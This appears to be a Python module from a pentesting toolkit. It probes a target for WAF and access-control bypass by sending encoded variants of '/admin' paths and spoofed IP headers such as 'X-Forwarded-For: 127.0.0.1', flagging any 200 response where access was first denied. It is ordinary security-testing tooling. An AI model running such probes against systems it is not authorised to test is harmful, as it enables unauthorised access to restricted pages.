import requests
import urllib.parse
from colorama import Fore, init
from core.threader import run_threads

init(autoreset=True)


headers_list = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"}
]


# 🔥 Load payloads from file
def load_payloads():
    try:
        with open("wordlists/bypass.txt") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return [
            "/admin",
            "/%61dmin",
            "/admin/",
            "/admin%20"
        ]


# 🔥 Encoding engine
def encode_payload(p):
    return [
        p,
        urllib.parse.quote(p),
        urllib.parse.quote_plus(p)
    ]


def run(target):

    print(Fore.GREEN + "[*] Running WAF bypass tests")

    # baseline request
    try:
        base = requests.get(target, timeout=5)
        base_code = base.status_code
    except:
        print(Fore.RED + "[!] Target not reachable")
        return

    print(Fore.CYAN + f"[+] Baseline status: {base_code}")

    payloads = load_payloads()

    # 🔥 threaded testing function
    def test_payload(p):

        variants = encode_payload(p)

        for v in variants:

            url = target + v

            try:
                r = requests.get(url, timeout=5)

                # ✅ CORRECT LOGIC
                if base_code in [401, 403] and r.status_code == 200:
                    print(Fore.RED + f"[🔥 BYPASS FOUND] {url} -> {r.status_code}")

                elif r.status_code != base_code:
                    print(Fore.YELLOW + f"[~] Interesting: {url} -> {r.status_code}")

                else:
                    print(Fore.WHITE + f"[ ] {url} -> {r.status_code}")

            except:
                pass

    # 🔥 run threads
    run_threads(test_payload, payloads, threads=20)

    print(Fore.GREEN + "\n[*] Testing header bypass")

    for h in headers_list:

        try:
            r = requests.get(target, headers=h, timeout=5)

            if base_code in [401, 403] and r.status_code == 200:
                print(Fore.RED + f"[🔥 HEADER BYPASS] {h} -> {r.status_code}")

            elif r.status_code != base_code:
                print(Fore.YELLOW + f"[~] Header interesting: {h} -> {r.status_code}")

            else:
                print(Fore.WHITE + f"[ ] {h} -> {r.status_code}")

        except:
            pass